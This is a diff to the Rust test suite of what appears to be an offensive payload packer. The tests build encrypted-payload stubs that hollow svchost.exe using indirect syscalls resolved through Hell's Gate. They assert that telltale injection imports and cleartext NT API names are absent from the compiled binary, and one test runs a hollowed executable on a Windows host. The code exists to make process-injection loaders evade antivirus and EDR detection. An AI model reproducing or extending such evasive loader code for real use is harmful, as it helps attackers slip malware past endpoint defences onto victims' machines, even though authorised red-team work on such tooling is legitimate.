@@ -451,14 +451,16 @@ mod tests {
             payload_path: "payload.bin".to_string(),
             build_args: std::collections::BTreeMap::new(),
         };
-        let pipeline = vec![crate::techniques::PipelineStep::ProcessHollowing(
+        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
             crate::techniques::process_hollowing::Params {
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
         )];
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
+        let syscalls = crate::engine::syscalls::SyscallsConfig::default();
         let stub_src =
-            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings).unwrap();
+            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings, &syscalls)
+                .unwrap();
         let stub_path = build_dir.join("main.rs");
         std::fs::write(&stub_path, stub_src).unwrap();
 
@@ -535,14 +537,19 @@ mod tests {
                 payload_path: "payload.bin".to_string(),
                 build_args: std::collections::BTreeMap::new(),
             };
-            let pipeline = vec![crate::techniques::PipelineStep::ProcessHollowing(
+            let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
                 crate::techniques::process_hollowing::Params {
                     target: target.clone(),
                 },
             )];
-            let stub_src =
-                crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings)
-                    .unwrap();
+            let stub_src = crate::engine::stub::render_main_rs(
+                &template,
+                &params,
+                &pipeline,
+                &strings,
+                &crate::engine::syscalls::SyscallsConfig::default(),
+            )
+            .unwrap();
             let stub_path = build_dir.join(format!("main_{name}.rs"));
             std::fs::write(&stub_path, stub_src).unwrap();
 
@@ -574,7 +581,7 @@ mod tests {
     #[ignore = "requires rustc and the compiled dependencies"]
     fn no_sensitive_literals_in_generated_stubs() {
         use crate::audit::{pe_info, strings};
-        use crate::techniques::{Category, PipelineStep};
+        use crate::techniques::{Category, RuntimeStep};
 
         let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
         let key = crate::engine::crypto::generate_key();
@@ -597,13 +604,13 @@ mod tests {
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
 
         for def in crate::techniques::all() {
-            let step: PipelineStep = serde_yml::from_str(def.params_example)
+            let step: RuntimeStep = serde_yml::from_str(def.params_example)
                 .unwrap_or_else(|e| panic!("{} params_example does not parse: {e}", def.name));
 
             // A Preparation technique needs an Execution technique so the stub
             // compiles; `reflective_loading` is used as the filler.
             let pipeline = if def.category == Category::Preparation {
-                let execution: PipelineStep =
+                let execution: RuntimeStep =
                     serde_yml::from_str("technique: reflective_loading\n").unwrap();
                 vec![step, execution]
             } else {
@@ -619,9 +626,14 @@ mod tests {
                 payload_path: "payload.bin".to_string(),
                 build_args: std::collections::BTreeMap::new(),
             };
-            let stub_src =
-                crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings)
-                    .unwrap();
+            let stub_src = crate::engine::stub::render_main_rs(
+                &template,
+                &params,
+                &pipeline,
+                &strings,
+                &crate::engine::syscalls::SyscallsConfig::default(),
+            )
+            .unwrap();
             let stub_path = build_dir.join(format!("main_{}.rs", def.name));
             std::fs::write(&stub_path, &stub_src).unwrap();
 
@@ -677,8 +689,14 @@ mod tests {
             build_args: std::collections::BTreeMap::new(),
         };
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
-        let rendered =
-            crate::engine::stub::render_custom_stub(&template, &params, &[], &strings).unwrap();
+        let rendered = crate::engine::stub::render_custom_stub(
+            &template,
+            &params,
+            &[],
+            &strings,
+            &crate::engine::syscalls::SyscallsConfig::default(),
+        )
+        .unwrap();
         assert!(rendered.warnings.is_empty(), "no techniques declared");
 
         let build_dir =
@@ -694,6 +712,215 @@ mod tests {
 
         let bytes = std::fs::read(&out).unwrap();
         assert_eq!(&bytes[..2], b"MZ", "custom stub must compile to a PE");
+
+        let _ = std::fs::remove_dir_all(&build_dir);
+    }
+
+    // --- indirect syscalls (phase 6a) ---
+
+    /// Builds a process-hollowing stub with the given syscall config, writing
+    /// `payload.bin` and the rendered stub into `build_dir`. Returns the path
+    /// of the compiled exe. `payload` is the plaintext to pack.
+    fn build_hollowing_exe(
+        build_dir: &Path,
+        name: &str,
+        syscalls: &crate::engine::syscalls::SyscallsConfig,
+        payload: &[u8],
+    ) -> PathBuf {
+        let key = crate::engine::crypto::generate_key();
+        let encrypted = crate::engine::crypto::encrypt_payload(payload, &key).unwrap();
+        std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();
+
+        let template = std::fs::read_to_string(
+            Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("templates")
+                .join("stub")
+                .join("main.rs.tpl"),
+        )
+        .unwrap();
+        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing(
+            crate::techniques::process_hollowing::Params {
+                target: r"C:\Windows\System32\svchost.exe".to_string(),
+            },
+        )];
+        let params = crate::engine::stub::StubParams {
+            nonce: encrypted.nonce,
+            key: encrypted.key,
+            ciphertext: encrypted.ciphertext.clone(),
+            plaintext_len: encrypted.plaintext_len,
+            stub_marker: crate::engine::stub::generate_stub_marker(),
+            payload_path: "payload.bin".to_string(),
+            build_args: std::collections::BTreeMap::new(),
+        };
+        let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
+        let stub_src =
+            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings, syscalls)
+                .unwrap();
+        let stub_path = build_dir.join(format!("main_{name}.rs"));
+        std::fs::write(&stub_path, stub_src).unwrap();
+
+        let deps = locate_stub_deps().unwrap();
+        let out = build_dir.join(format!("out_{name}.exe"));
+        compile_stub(&stub_path, &out, &deps).unwrap();
+        out
+    }
+
+    /// Builds the hollowing stub in both syscall modes and asserts the IAT
+    /// effect of `mode: indirect`: the four suspicious Win32 imports
+    /// (VirtualAllocEx, WriteProcessMemory, ReadProcessMemory, ResumeThread)
+    /// disappear, the NT names never appear in cleartext, and the output is
+    /// still a PE. Marked `#[ignore]` because it compiles two stubs.
+    #[test]
+    #[ignore = "requires rustc and the compiled dependencies"]
+    fn indirect_syscalls_remove_the_suspicious_imports() {
+        use crate::audit::pe_info::{self, ImportItem};
+
+        let build_dir =
+            std::env::temp_dir().join(format!("batesian_syscalls_{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&build_dir);
+        std::fs::create_dir_all(&build_dir).unwrap();
+
+        // This test only inspects the compiled binary, so the payload content
+        // is irrelevant.
+        let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
+
+        let modes = [
+            ("none", crate::engine::syscalls::SyscallsConfig::default()),
+            (
+                "indirect",
+                crate::engine::syscalls::SyscallsConfig {
+                    mode: crate::engine::syscalls::SyscallsMode::Indirect,
+                    resolver: crate::engine::syscalls::Resolver::HellsGate,
+                },
+            ),
+        ];
+
+        for (name, syscalls) in modes {
+            let out = build_hollowing_exe(&build_dir, name, &syscalls, &plaintext);
+            let binary = std::fs::read(&out).unwrap();
+            assert_eq!(&binary[..2], b"MZ", "{name}: the stub must compile to a PE");
+
+            let pe = pe_info::analyze(&binary).unwrap();
+            let imported: Vec<String> = pe
+                .imports
+                .iter()
+                .flat_map(|d| &d.functions)
+                .filter_map(|f| match f {
+                    ImportItem::Named(n) => Some(n.clone()),
+                    ImportItem::Ordinal(_) => None,
+                })
+                .collect();
+
+            const SUSPICIOUS: &[&str] = &[
+                "VirtualAllocEx",
+                "WriteProcessMemory",
+                "ReadProcessMemory",
+                "ResumeThread",
+            ];
+
+            if name == "indirect" {
+                for s in SUSPICIOUS {
+                    assert!(
+                        !imported.iter().any(|n| n == s),
+                        "indirect mode must not import {s}"
+                    );
+                }
+                // The NT names must not appear anywhere in the binary.
+                for nt in [
+                    "NtAllocateVirtualMemory",
+                    "NtWriteVirtualMemory",
+                    "NtReadVirtualMemory",
+                    "NtResumeThread",
+                    "NtUnmapViewOfSection",
+                ] {
+                    assert!(
+                        !binary.windows(nt.len()).any(|w| w == nt.as_bytes()),
+                        "indirect mode leaked cleartext {nt}"
+                    );
+                }
+                // The userland APIs the stub still uses stay imported.
+                for kept in ["CreateProcessA", "LoadLibraryA", "GetProcAddress"] {
+                    assert!(
+                        imported.iter().any(|n| n == kept),
+                        "indirect mode should still import {kept}"
+                    );
+                }
+            } else {
+                for s in SUSPICIOUS {
+                    assert!(
+                        imported.iter().any(|n| n == s),
+                        "none mode must keep importing {s} (baseline)"
+                    );
+                }
+            }
+        }
+
+        let _ = std::fs::remove_dir_all(&build_dir);
+    }
+
+    /// Builds the hollowing stub with `mode: indirect` and runs the resulting
+    /// binary on a Windows host.
+    ///
+    /// The stub exits `1` only when its own error path fires (decryption,
+    /// syscall resolution, or a failed nt_* call); so the assertion is that it
+    /// does NOT exit `1`. Any other outcome is accepted: the stub may relay the
+    /// hollowed process's exit code (process hollowing can crash the payload on
+    /// hardened hosts; that is a separate, pre-existing limitation and the
+    /// stub's syscall calls all returned success before the hand-off). The test
+    /// does not rely on the payload's output, which it prints to stdout.
+    ///
+    /// Marked `#[ignore]`; it only does something on a Windows host.
+    #[test]
+    #[ignore = "requires rustc, compiled deps and a Windows host with a desktop"]
+    fn indirect_syscalls_binary_runs_on_windows() {
+        if !cfg!(windows) {
+            return;
+        }
+
+        let build_dir = std::env::temp_dir().join(format!("batesian_run_{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&build_dir);
+        std::fs::create_dir_all(&build_dir).unwrap();
+
+        let syscalls = crate::engine::syscalls::SyscallsConfig {
+            mode: crate::engine::syscalls::SyscallsMode::Indirect,
+            resolver: crate::engine::syscalls::Resolver::HellsGate,
+        };
+        // The real test payload (it prints a fixed marker), not the synthetic
+        // bytes the compile-only tests use: this test actually runs the stub,
+        // which parses and executes the payload.
+        let payload = std::fs::read(
+            Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("examples")
+                .join("payloads")
+                .join("test_payload.exe"),
+        )
+        .unwrap();
+        let out = build_hollowing_exe(&build_dir, "run", &syscalls, &payload);
+
+        let mut child = std::process::Command::new(&out)
+            .spawn()
+            .expect("the exe must start");
+        // Give the stub time to decrypt, resolve SSNs and hollow svchost.
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
+        loop {
+            match child.try_wait() {
+                Ok(Some(status)) => {
+                    assert_ne!(
+                        status.code(),
+                        Some(1),
+                        "the stub failed through its own error path (syscall layer)"
+                    );
+                    break;
+                }
+                Ok(None) if std::time::Instant::now() >= deadline => {
+                    // Still alive: the stub is waiting on the hollowed process.
+                    let _ = child.kill();
+                    break;
+                }
+                Ok(None) => std::thread::sleep(std::time::Duration::from_millis(200)),
+                Err(e) => panic!("could not check the packed exe: {e}"),
+            }
+        }
 
         let _ = std::fs::remove_dir_all(&build_dir);
     }
